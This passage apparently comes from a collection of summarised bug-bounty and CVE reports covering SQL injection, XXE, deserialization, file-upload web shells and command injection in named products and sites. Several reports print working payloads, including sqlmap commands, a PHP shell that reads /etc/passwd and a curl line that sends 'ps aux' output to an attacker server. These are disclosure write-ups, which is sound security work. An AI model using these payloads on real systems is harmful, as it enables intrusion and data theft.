1. Install and run the Synthetics Recorder in development mode or download the binary.
2. Start recording a session with a malicious URL designed to break out of the comment context in the generated code.
3. Export the recorded session and execute it using the synthetic runner to trigger the arbitrary command execution.

--------------------------------------------------------------------------------

Report 29: CVE-2022-40604: Apache Airflow: Format String Vulnerability
================================================================================
Vulnerability Description:
There is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py. An attacker can control part of the log_relative_path, which is made up of run_id and other things. This allows the attacker to inject format strings and access sensitive information such as secret_key, database connection string, and various configurations.

Steps to Reproduce:
1. Enter the DAGs menu, Choose any DAG, select Trigger DAG w/ config.
2. Set the run_id to {ti.task.__class__.__init__.__globals__[conf].__dict__} and trigger it.
3. Enter the /xcom/list/ page, click to enter the corresponding task page.
4. Click the Log option and capture the packet, you will get a request similar to the following: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null
5. Modify try_number to a nonexistent value, such as 9999, such as: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null
6. Paste the modified url into the browser for access

--------------------------------------------------------------------------------

Report 30: Struct type confusion RCE
================================================================================
Vulnerability Description:
The vulnerability involves a struct type confusion in mruby that allows an attacker to manipulate memory structures, leading to arbitrary code execution. By carefully crafting input, the attacker can confuse the interpreter about the type of a struct, resulting in memory corruption and control over the instruction pointer.

Steps to Reproduce:
1. Analyze the mruby interpreter to understand how struct types are handled in memory.
2. Create a proof of concept script that manipulates struct types to cause type confusion, leading to arbitrary memory access.
3. Execute the script in the mruby environment to demonstrate control over the instruction pointer, causing a segfault at a controlled address (e.g., 0x0000133713371337).
4. Extend the attack to achieve arbitrary read/write primitives for full remote code execution.

--------------------------------------------------------------------------------

Report 31: TOCTTOU bug in mrb_str_setbyte leading the memory corruption
================================================================================
Vulnerability Description:
The vulnerability is a Time-of-Check to Time-of-Use (TOCTTOU) bug in mrb_str_setbyte where the string length is cached before argument processing. During argument conversion (to_i), malicious Ruby code can modify the string, causing it to be reallocated shorter. This leads to an out-of-bounds write when the original cached length is used.

Steps to Reproduce:
1. Create a large string $s with '9' followed by many newlines
2. Define a class Tmp with a to_i method that modifies $s and $k
3. Call $s.setbyte(128, Tmp.new) which triggers the vulnerability
4. Observe memory corruption or crash due to out-of-bounds write

--------------------------------------------------------------------------------

Report 32: links the user may download can be a malicious files
================================================================================
Vulnerability Description:
The vulnerability allows malicious files to be downloaded by users due to the browser's handling of file extensions based on the URL path or domain name. This can lead to the execution of malicious code if the downloaded file's extension is executable (e.g., .com, .exe).

Steps to Reproduce:
1. Execute HTML with a link to http://example.com and use the 'Save Link as...' option.
2. Visit http://example.com directly and use the 'Save Page as...' option.
3. Execute HTML with a link to http://example.com and click the link to download directly.

--------------------------------------------------------------------------------

Report 33: Remote Code Execution on ownCloud instances with ImageMagick installed
================================================================================
Vulnerability Description:
A remote code execution vulnerability exists in ownCloud instances with ImageMagick installed. Attackers can exploit this by uploading specially crafted files (MSL and SVG) that trigger ImageMagick to overwrite PHP files with malicious code when generating previews.

Steps to Reproduce:
1. Build the docker image with ImageMagick installed: `docker build . -t owncloud-imagemagick`
2. Start the docker container: `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
3. Log in to the ownCloud instance at localhost:8080 using username 'admin' and password 'admin'
4. Upload the files `exploit.msl` and `image.rgb` to the ownCloud instance
5. Reload the page to trigger the exploit, which rewrites `index.php` with arbitrary PHP code

--------------------------------------------------------------------------------

Report 34: Command Execution because of extension handling
================================================================================
Vulnerability Description:
The vulnerability involves Brave browser's handling of website TLDs when saving pages. By saving a malicious website with a .bat or .com extension, the saved file can be executed as a script or binary, leading to command execution. Windows' warning for downloaded applications can be bypassed using filenames like 'Update' or 'Setup'.

Steps to Reproduce:
1. Visit a malicious website with a .bat or .com extension, e.g., http://paulos.bat or https://malicioussetup.com
2. Save the webpage using Ctrl+S in Brave browser, which will save the file with the website's name (e.g., paulos.bat or malicioussetup.com)
3. Execute the saved file, which will run the embedded commands (e.g., opening calculator or other malicious code)

--------------------------------------------------------------------------------

Report 35: SQL Injection in CVE Discovery Search 
================================================================================
Vulnerability Description:
Unsanitized user-controlled inputs in the CVE Discovery Search allow for SQL injection. Search terms are split on whitespace but no additional sanitization is applied, allowing arbitrary SQL statements, such as a blind or timing-based attack.

Steps to Reproduce:
1. Visit https://hackerone.com/intelligence/cve_discovery
2. Enter a search term that normally returns results, plus an injection payload such as //AND//'1%'='1 and confirm that the results are still returned
3. Change the payload to //AND//'1%'='0 and confirm that no results are returned

--------------------------------------------------------------------------------

Report 36: Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation
================================================================================
Vulnerability Description:
The vulnerability allows code injection via the nginx.ingress.kubernetes.io/permanent-redirect annotation in Kubernetes Ingress objects. The annotation value is not sanitized before being passed to the NGINX configuration, enabling attackers with ingress creation/update permissions to execute commands on the ingress-nginx-controller pod. This can lead to Kubernetes API access via the mounted ServiceAccount token and potential cluster-wide secret exfiltration.

Steps to Reproduce:
1. Install NGINX Ingress controller using Helm with the provided values.yaml
2. Apply the ingress.yaml file containing the malicious nginx.ingress.kubernetes.io/permanent-redirect annotation

--------------------------------------------------------------------------------

Report 37: RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/
================================================================================
Vulnerability Description:
This vulnerability allows an attacker to upload a malicious file (e.g., a web shell) by exploiting a null byte truncation in the file extension. The server processes the file as having the malicious extension (e.g., .asp) instead of the benign one (e.g., .png), leading to remote code execution (RCE).

Steps to Reproduce:
1. Navigate to the target website and locate the file upload functionality.
2. Upload a file with a malicious extension (e.g., .asp) followed by a null byte and a benign extension (e.g., .png). The server may truncate the extension at the null byte, allowing the malicious file to be executed.

--------------------------------------------------------------------------------

Report 38: Blind Sql Injection in https://████████/
================================================================================
Vulnerability Description:
The application is vulnerable to Blind SQL Injection via the searchValue parameter in the GetAllFacilitiesForNewUserRegistration SOAP request. This allows an attacker to extract database information such as db_name()=dsfdb and user=public\dsfwsuser.

Steps to Reproduce:
1. Navigate to the registration page at https://████████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser
2. Intercept the SOAP request to GetAllFacilitiesForNewUserRegistration and modify the searchValue parameter to include SQL injection payloads

--------------------------------------------------------------------------------

Report 39: RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`
================================================================================
Vulnerability Description:
The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.

Steps to Reproduce:
1. Login into your imgur account and upload an image.
2. Move your mouse over the image, click on the tiny button with pencil on it, then click 'Edit'.
3. Select a random rectangle on the image, then click 'Apply'.
4. In the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510
5. Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-.
6. Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body.

--------------------------------------------------------------------------------

Report 40: Admin Command Injection via username in user_archive ExportCsvFile
================================================================================
Vulnerability Description:
This vulnerability allows an admin to perform command injection via a modified username in a backup file. The username is used in a gzip command within backticks, and by restoring a backup with a malicious username, the admin can execute arbitrary commands on the server.

Steps to Reproduce:
1. Login as an admin on try.discourse.org
2. Make a backup of the website and download it
3. Extract the contents of the archive
4. Modify one of the usernames of an account you have access to: test.txt;wget mrzioto.com
5. Repackage the archive
6. Upload the modified archive
7. Restore from backup
8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it)
9. Send the POST request for creating a user export archive: http://34.205.246.2/export_csv/export_entity.json POST: entity_type=user&entity=user_archive

--------------------------------------------------------------------------------

Report 41: SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription
================================================================================
Vulnerability Description:
The invite_code parameter in the registration process is vulnerable to PostgreSQL injection, allowing an attacker to execute arbitrary SQL commands, potentially leading to data exfiltration or other malicious activities.

Steps to Reproduce:
1. During registration, make a POST request to /interaction/KTTbkN8LaJgYIb7fIwPYX/signup with the invite_code parameter containing a single quote to observe a 500 error.
2. Use a time-based blind SQL injection payload like invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))-- to confirm the vulnerability by observing delayed responses.

--------------------------------------------------------------------------------

Report 42: Mercurial can be tricked into granting authorized users access to the Python debugger
================================================================================
Vulnerability Description:
The vulnerability allows authorized users to trick Mercurial into granting access to the Python debugger by exploiting a lack of input validation in customized hg-ssh wrappers. This can lead to arbitrary Python code execution.

Steps to Reproduce:
1. Identify a service hosting a Mercurial server with a customized hg-ssh wrapper that does not validate user input to the repo attribute.
2. Supply a string of "--debugger" as the repo attribute when interacting with the Mercurial server.
3. This causes the internal hg binary to drop to a Pdb shell, allowing arbitrary Python code execution.

--------------------------------------------------------------------------------

Report 43: XXE in DoD website that may lead to RCE
================================================================================
Vulnerability Description:
The vulnerability is an XML External Entity (XXE) injection in a DoD website. It allows an attacker to send specially crafted XML requests that the server processes, potentially leading to unauthorized access to the local file system or other server-side resources.

Steps to Reproduce:
1. Send a POST request to /PSIGW/PeopleSoftServiceListeningConnector with a Content-Type header set to text/xml
2. Include a malicious XML payload in the request body that defines an external entity, e.g., <!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>

--------------------------------------------------------------------------------

Report 44: CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]
================================================================================
Vulnerability Description:
The vulnerability is an elevation of privilege issue in Microsoft Skype for Business, where an attacker can exploit missing security updates to gain elevated privileges and potentially access sensitive information. The attack involves injecting a malicious payload through a parameter in a web request, which the server processes insecurely.

Steps to Reproduce:
1. Navigate to https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx
2. Intercept the request using Burp Suite and send it to the repeater
3. Add the parameter 'meeturl=' with a base64 encoded payload: LMN%{1337*1337}#.xx
4. Send the modified request to observe the server's vulnerable response

--------------------------------------------------------------------------------

Report 45: SQL Injection on https://████████/
================================================================================
Vulnerability Description:
The vulnerability is a SQL Injection in a web application where the ███████ parameter does not properly sanitize input, allowing attackers to execute arbitrary SQL queries. This can lead to unauthorized data access, including sensitive information like emails, usernames, and passwords, and potentially remote code execution.

Steps to Reproduce:
1. Open terminal and execute the first curl command with a crafted SQL injection payload (SLEEP(10)) to demonstrate time-based SQL injection.
2. Execute the second curl command with a different SQL injection payload (updatexml) to extract database version information, confirming the vulnerability.

--------------------------------------------------------------------------------

Report 46: Uploaded XLF files result in External Entity Execution
================================================================================
Vulnerability Description:
The vulnerability involves XML External Entity (XXE) execution in Weblate, allowing users with translation upload privileges to read arbitrary files on the server. This is achieved by exploiting the XML processing in the translate-toolkit when handling .XLF files, which can include external entity references to access local files.

Steps to Reproduce:
1. Log in as a user with permission to upload translation files.
2. Download translations as XLF from a component.
3. Modify the XLF file by adding XML external entity declarations and replacing a translation text with the entity reference.
4. Upload the modified XLF file back to the server.
5. Observe the contents of the targeted file (e.g., /etc/passwd) displayed as a translation.

--------------------------------------------------------------------------------

Report 47: Remote Code Execution (RCE) in a DoD website
================================================================================
Vulnerability Description:
The vulnerability is an Expression Language injection in a DoD application using Primefaces 5.3, which allows remote code execution through a crafted URL. The PoC demonstrates the ability to trigger DNS requests from the server, indicating potential for data exfiltration or file manipulation.

Steps to Reproduce:
1. Generate the payload using Primefaces-5.3.jar and encrypt it with the default key 'primefaces'. Change the domain in the payload to one you control.
2. Append the generated payload to the URL: https://████/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdrid=<YOUR_PAYLOAD_HERE>
3. Send a GET request to the modified URL using curl or a similar tool.
4. Observe the DNS request from the DoD server to the domain you specified in the payload.

--------------------------------------------------------------------------------

Report 48: XML External Entity (XXE) Injection
================================================================================
Vulnerability Description:
XML External Entity (XXE) injection vulnerability allows an attacker to read arbitrary files on the server, perform SSRF, conduct DoS attacks, or potentially execute remote code by exploiting improperly configured XML parsers that process external entities.

Steps to Reproduce:
1. Send a POST request to /ca/rest/certrequests with an XML payload containing an external entity reference to a sensitive file (e.g., file:///etc/passwd).
2. Observe the server's response to see if it includes the contents of the referenced file, indicating successful XXE exploitation.

--------------------------------------------------------------------------------

Report 49: RCE via ssh:// URIs in multiple VCS 
================================================================================
Vulnerability Description:
The vulnerability involves multiple version control systems (Git, SVN, Mercurial) where a crafted ssh:// URI can lead to remote code execution (RCE). The flaw lies in how these systems handle ssh:// URIs, allowing an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. Identify the vulnerability in Git, SVN, and Mercurial related to ssh:// URIs.
2. Exploit the vulnerability by crafting a malicious ssh:// URI that triggers remote code execution when processed by the VCS.

--------------------------------------------------------------------------------

Report 50:  SQL injections
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the 'from' parameter of a file upload endpoint, allowing an attacker to execute arbitrary SQL commands on the server database.

Steps to Reproduce:
1. Send a POST request to /FileTransfer/Upload with a malicious SQL injection payload in the 'from' parameter
2. Observe the DNS query on Burp Collaborator indicating successful SQL injection

--------------------------------------------------------------------------------

Report 51: www.drivegrab.com SQL injection
================================================================================
Vulnerability Description:
The vulnerability is an SQL injection in the Formidable Pro WordPress plugin, where unauthenticated users can exploit the 'display-frm-data' shortcode's order parameter to inject malicious SQL queries. The injection occurs in the ORDER BY clause of an intermediate query, allowing data extraction through careful manipulation of query parameters and bypassing comma restrictions.

Steps to Reproduce:
1. Send a request to the AJAX endpoint with a basic form preview: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
2. Inject SQL via the 'display-frm-data' shortcode parameters: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order="zzz"]YYY'
3. Use sqlmap with specialized parameters to bypass comma restrictions and extract data: ./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"' --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"

--------------------------------------------------------------------------------

Report 52: CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
================================================================================
Vulnerability Description:
DotNetNuke (DNN) versions 5.0.0 to 9.3.0 are vulnerable to a deserialization attack via the DNNPersonalization cookie, which can lead to remote code execution (RCE). The vulnerability arises when the application processes the cookie during the loading of user profile data, particularly when handling 404 errors with the default error page.

Steps to Reproduce:
1. Identify the target DotNetNuke (DNN) version (5.0.0 - 9.3.0) and confirm it is configured to use the default 404 error page.
2. Use YSoSerial.net with the DotNetNuke plugin to generate a malicious payload that exploits the deserialization vulnerability in the DNNPersonalization cookie.
3. Send a crafted HTTP request to the target server with the malicious payload in the DNNPersonalization cookie to trigger the deserialization vulnerability.
4. Observe the response to confirm remote code execution (RCE) or other desired effects (e.g., file read, reverse shell).

--------------------------------------------------------------------------------

Report 53: SQL Injection on █████
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection on a subdomain where user input is not properly sanitized, allowing an attacker to execute arbitrary SQL queries. This can lead to unauthorized access to sensitive database information.

Steps to Reproduce:
1. Open Firefox or any browser
2. Visit the vulnerable URL with a SQL injection payload like: https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil
3. Observe the MySQL version or other database information in the response

--------------------------------------------------------------------------------

Report 54: Mercurial git subrepo lead to arbritary command injection
================================================================================
Vulnerability Description:
A crafted Mercurial repository with a malicious Git subrepository can lead to arbitrary command execution on the user's OS via a .git/hooks/post-update script. This affects Mercurial 4.4 and earlier, particularly when repositories are created programmatically.

Steps to Reproduce:
1. Create a specially malformed Mercurial repository containing a Git subrepository with a malicious .git/hooks/post-update script.
2. Programmatically push this repository to a target system or share it with a victim who uses Mercurial 4.4 or earlier.

--------------------------------------------------------------------------------

Report 55: SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent 
================================================================================
Vulnerability Description:
SQL injection vulnerability in labs.data.gov's /dashboard/datagov/csv_to_json endpoint via User-Agent header manipulation, allowing time-based blind SQL injection attacks against the MySQL database.

Steps to Reproduce:
1. Send a GET request to https://labs.data.gov/dashboard/datagov/csv_to_json with a malicious User-Agent header containing SQL injection payload (e.g., 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'')
2. Observe delayed response (25 seconds in this case) confirming SQL injection vulnerability

--------------------------------------------------------------------------------

Report 56: SQL injection in MilestoneFinder order method
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the MilestoneFinder class of GitLab, specifically in the order method. The method directly uses user-supplied input in the 'order' parameter without proper sanitization, allowing an attacker to inject arbitrary SQL queries. This can be exploited to extract sensitive information from the database, including private access and shell tokens, potentially leading to privilege escalation and arbitrary code execution.

Steps to Reproduce:
1. Create a new group on a GitLab instance and create two milestones within it.
2. Send a crafted GET request to the group milestones endpoint with a malicious SQL injection payload in the 'order' parameter to extract sensitive data from the database.

--------------------------------------------------------------------------------

Report 57: Blind SQL injection on ████████
================================================================================
Vulnerability Description:
The application is vulnerable to blind SQL injection via the 'rememail' parameter in the POST request to viewem6.php. This allows an attacker to execute arbitrary SQL queries, extract database information (such as the MySQL version), and potentially access sensitive data.

Steps to Reproduce:
1. Send a POST request to https://████████/elist/viewem6.php with the parameter 'rememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'' to induce a 2-second delay in the response.
2. Send a POST request to https://████████/elist/viewem6.php with the parameter 'rememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'' to determine the MySQL version by observing the response delay.

--------------------------------------------------------------------------------

Report 58: [critical] sql injection by GET method
================================================================================
Vulnerability Description:
The vulnerability is an SQL injection via the GET method, where the attacker can manipulate URL parameters to inject SQL queries. This allows the attacker to bypass intended query logic and potentially access unauthorized data from the database.

Steps to Reproduce:
1. Identify a URL endpoint that appears to handle dynamic content, such as https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv
2. Modify the URL by injecting SQL conditions (e.g., changing '1'=='1' to '1'=='0') to observe different responses from the server

--------------------------------------------------------------------------------

Report 59: Insecure implementation of deserialization in funcster
================================================================================
Vulnerability Description:
The funcster package allows arbitrary code execution during deserialization of JSON due to its insecure implementation of function deserialization. An attacker can craft a malicious JSON payload with an IIFE that executes code during the deserialization process, leading to remote code execution.

Steps to Reproduce:
1. Install the funcster package: `npm install funcster`
2. Create a malicious JSON payload with an IIFE (Immediately-Invoked Function Expression) that executes arbitrary code during deserialization
3. Use the funcster.deepDeserialize method to deserialize the malicious JSON payload, triggering the code execution

--------------------------------------------------------------------------------

Report 60: Insecure implementation of deserialization in cryo
================================================================================
Vulnerability Description:
The 'cryo' package's insecure deserialization implementation allows attackers to execute arbitrary code by manipulating the __proto__ property and injecting malicious functions during the deserialization process. This leads to code execution when the deserialized object's prototype methods (e.g., toString, valueOf) are invoked.

Steps to Reproduce:
1. Install the 'cryo' package (version 0.0.6) in a Node.js environment.
2. Use the provided PoC JSON payload to exploit the deserialization vulnerability by calling Cryo.parse().
3. Observe the execution of arbitrary code when the deserialized object is interacted with (e.g., via console.log).

--------------------------------------------------------------------------------

Report 61: forum.getmonero.org Shell upload
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to upload a malicious PHP shell disguised as an image file to the server due to insufficient file type validation in the profile picture upload feature. This leads to remote code execution by accessing the uploaded PHP file.

Steps to Reproduce:
1. Embed a shell into an image using exiftool: exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
2. Rename the image to .php extension and upload it to the forum.getmonero.org profile picture upload feature

--------------------------------------------------------------------------------

Report 62: RCE via Print function [Simplenote 1.1.3 - Desktop app] 
================================================================================
Vulnerability Description:
The vulnerability involves a stored XSS in Simplenote 1.1.3 Desktop app that can be escalated to RCE when a user prints or saves a malicious note as PDF. The XSS is triggered during the print operation, allowing execution of arbitrary JavaScript, which is then used to spawn system processes.

Steps to Reproduce:
1. Download and install Simplenote 1.1.3 Desktop app. Ensure Markdown is not enabled.
2. Create a new note and insert the malicious payload: `1">'><details/open/ontoggle=confirm('XSS')>`. Go to File --> Print to trigger the XSS.
3. For RCE, use the encoded payload to execute `/usr/bin/gnome-calculator` when the note is printed or saved as PDF.

--------------------------------------------------------------------------------

Report 63: Remote code execution on Basecamp.com
================================================================================
Vulnerability Description:
A critical flaw in Basecamp's profile image upload function allows remote code execution due to improper handling of PostScript/EPS files disguised as GIFs. The server uses ImageMagick/GraphicsMagick, which invokes Ghostscript for processing, and the outdated Ghostscript version is vulnerable to CVE-2017-8291.

Steps to Reproduce:
1. Upload a specially crafted PostScript/EPS file renamed to .gif (e.g., rce.gif) as a profile image on Basecamp.com
2. The server processes the file using ImageMagick/GraphicsMagick, which invokes Ghostscript due to the '%!' header, exploiting CVE-2017-8291 to execute arbitrary commands

--------------------------------------------------------------------------------

Report 64: SQL injection in Serendipity (serendipity_fetchComments)
================================================================================
Vulnerability Description:
An authenticated administrator can exploit SQL injection in the Serendipity CMS by manipulating configuration fields that are used unsafely in SQL queries. This allows extraction of database records or file access on the server.

Steps to Reproduce:
1. Access the Serendipity admin panel as an authenticated administrator.
2. Alter either 'Entries to display on frontpage' or 'Entries to display in Feeds' by adding a non-numeric character.
3. Access the affected page (rss.php for Feeds, homepage for frontpage) to trigger the SQL injection.

--------------------------------------------------------------------------------

Report 65: SQL Injection vulnerability located at ████████
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the CCD_itemID parameter of a web application, allowing attackers to execute arbitrary SQL queries. The current user has DBA privileges, potentially enabling data retrieval and remote code execution.

Steps to Reproduce:
1. Identify the vulnerable URL containing the unsanitized parameter CCD_itemID
2. Use sqlmap with the provided command to exploit the SQL injection and verify database access

--------------------------------------------------------------------------------

Report 66: Malware in `active-support` gem
================================================================================
Vulnerability Description:
The `active-support` gem is a malicious copy of the legitimate `activesupport` gem, which includes a compiled extension that resolves a base64-encoded domain, downloads a payload, and executes it on the victim's machine.

Steps to Reproduce:
1. Install the malicious `active-support` gem (with a hyphen) instead of the legitimate `activesupport` gem.
2. Run any Ruby code that requires the gem, triggering the embedded malicious code.

--------------------------------------------------------------------------------

Report 67: [samsung-remote] Command injection
================================================================================
Vulnerability Description:
samsung-remote does not sanitize the IP address argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection. It is not unlikely that some systems using this package will pass a user-controlled IP address to the function, thus inadvertently allowing arbitrary code execution by the user.

Steps to Reproduce:
1. Install samsung-remote: npm install samsung-remote --save.
2. Create the following index.js file with the malicious IP address: '127.0.0.1; touch /tmp/malicious;'
3. Execute node index.js
4. Check that the injected command was executed: ls /tmp/

--------------------------------------------------------------------------------

Report 68: Public Jenkins instance with /script enabled
================================================================================
Vulnerability Description:
The Jenkins instance has the script console enabled and accessible without authentication, allowing remote code execution (RCE) by executing arbitrary Groovy scripts. Additionally, the instance allows access to the AWS metadata server, which could lead to further exploitation.

Steps to Reproduce:
1. Access the Jenkins instance at https://54.186.253.37/script
2. Enter the Groovy script 'ls /'.execute().text to list the root directory contents

--------------------------------------------------------------------------------

Report 69: [apex-publish-static-files] Command Injection on connectString
================================================================================
Vulnerability Description:
The apex-publish-static-files npm module is vulnerable to command injection via the connectString parameter, which is passed unsanitized to execSync(), allowing arbitrary command execution.

Steps to Reproduce:
1. Install the vulnerable module: npm i apex-publish-static-files
2. Create an index.js file with malicious connectString payload and execute it: node index.js

--------------------------------------------------------------------------------

Report 70: chrome://brave navigation from web
================================================================================
Vulnerability Description:
The vulnerability allows navigation to privileged pages like 'chrome://brave' from a web context by exploiting the 'noopener' attribute in popups, violating the Same-Origin Policy (SOP) and potentially leading to Remote Code Execution (RCE).

Steps to Reproduce:
1. Host the provided Proof of Concept (PoC) on a web server.
2. Click the button in the PoC to trigger the navigation to 'chrome://brave'.

--------------------------------------------------------------------------------

Report 71: SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter
================================================================================
Vulnerability Description:
The embedded_submission_form_uuid parameter in the /graphql endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands including time-delay operations.

Steps to Reproduce:
1. Send a POST request to the GraphQL endpoint with a malicious SQL injection payload in the embedded_submission_form_uuid parameter
2. Observe the delayed response indicating successful SQL injection execution (e.g., pg_sleep(30))

--------------------------------------------------------------------------------

Report 72: Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload
================================================================================
Vulnerability Description:
The vulnerability involves an arbitrary file read via the ffmpeg HLS parser on Flickr. By uploading a specially crafted AVI file containing an HLS playlist with references to external files, an attacker can disclose local files such as /etc/passwd. This could potentially be escalated to SSRF (Server-Side Request Forgery) under certain conditions.

Steps to Reproduce:
1. Download the attached file READ__etc_passwd.avi (F413554).
2. Go to https://www.flickr.com/photos/upload/ and upload the attached file.

--------------------------------------------------------------------------------

Report 73: SQL injection on the https://████/
================================================================================
Vulnerability Description:
The vulnerability is a Blind SQL injection in the /library.php endpoint, where the doc_id parameter is vulnerable. The attacker can inject SQL commands that cause the database to delay its response, confirming the injection. The database appears to be MySQL 5, and the SQL statement is executed 5 times on the database side, as evidenced by the response time being 5 times the supplied sleep value.

Steps to Reproduce:
1. Send a GET request to /library.php with the parameter path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh
2. Observe the response time to confirm the SQL injection vulnerability (response time increases proportionally to the sleep value)

--------------------------------------------------------------------------------

Report 74: SQL Injection in the get_publications.php on the https://█████
================================================================================
Vulnerability Description:
A time-based SQL injection vulnerability exists in the 'pub_group_id' parameter of the get_publications.php endpoint. This allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized data access or database manipulation.

Steps to Reproduce:
1. Identify the vulnerable parameter 'pub_group_id' in the URL: https://█████/pubs/get_publications.php
2. Inject a time-based SQL payload into the 'pub_group_id' parameter to trigger a delay in the response, e.g., 'wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b''

--------------------------------------------------------------------------------

Report 75: SQL Injection in the `move_papers.php` on the https://██████████
================================================================================
Vulnerability Description:
Time-based SQL Injection vulnerability in the `move_papers.php` script via the `pub_group_id` parameter, allowing an attacker to execute arbitrary SQL commands and extract database information by observing response delays.

Steps to Reproduce:
1. Identify the target URL: https://██████████/pubs/move_papers.php
2. Send a crafted GET request with the malicious pub_group_id parameter: GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1

--------------------------------------------------------------------------------

Report 76: Webshell via File Upload on ecjobs.starbucks.com.cn
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to upload malicious ASP files by bypassing file type restrictions through adding a space after the file extension. This leads to arbitrary command execution on the server, potentially exposing sensitive data and internal network access.

Steps to Reproduce:
1. Sign in to https://ecjobs.starbucks.com.cn and navigate to the resume endpoint.
2. Intercept the avatar upload request using Burp Suite, modify the filename by adding a space after the file extension (e.g., '.asp '), and upload a malicious ASP file.
3. Access the uploaded file to execute OS commands on the server, such as listing directories or viewing source code.

--------------------------------------------------------------------------------

Report 77: [untitled-model] sql injection
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the `untitled-model` npm package, which does not properly escape user inputs in its query generation functions. This allows an attacker to manipulate SQL queries by injecting malicious input, potentially leading to unauthorized data access or other database operations.

Steps to Reproduce:
1. Install the module using `yarn add untitled-model`
2. Set up a database with a `user` table and insert some test data
3. Run a proof-of-concept script that demonstrates SQL injection by manipulating the `id` parameter in the `filter` function
4. Observe the output showing that the SQL injection was successful, returning data for `id=2` when the query was designed to fetch `id=1`

--------------------------------------------------------------------------------

Report 78: [increments] sql injection
================================================================================
Vulnerability Description:
The increments module is vulnerable to SQL injection in the vote function, allowing attackers to inject arbitrary SQL code to manipulate poll results, such as creating fake votes.

Steps to Reproduce:
1. Install the increments module: npm install increments
2. Run the proof-of-concept code to exploit the SQL injection vulnerability by injecting malicious SQL into the vote function

--------------------------------------------------------------------------------

Report 79: SQL Injection in ████
================================================================================
Vulnerability Description:
There is an SQL injection vulnerability in ████████ in the /█████/recruiter/updapp.aspx page, exploitable through the app_id form parameter. An attacker could use this vulnerability to control the content in the database, exfiltrate information, and obtain remote code execution.

Steps to Reproduce:
1. Visit https://█████████/Gateway/sso.aspx and sign in.
2. With the Network tab of devtools open, visit https://██████/████/recruiter/updapp.aspx
3. Replay the GET request that returned the HTTP 500 error as a POST request with the body app_id='. This can be done by right clicking on the request, copying it as cURL, pasting the command in terminal, and appending -k -X POST --data "app_id='".
4. Notice in the response, there is an error: ORA-01756: quoted string not properly terminated.
5. Replay the request in the same way as shown in #3, but with the body app_id='' (this time append -k -X POST --data "app_id=''" to the cURL command).
6. Notice in the response, there is an error: ORA-01722: invalid number.
7. Repeat step #3 as many times as you like. An odd number of apostrophes (') will cause the SQL query to fail because it is syntactically invalid, and an even number will cause it to fail because it is valid, but apostrophes are not numbers.

--------------------------------------------------------------------------------

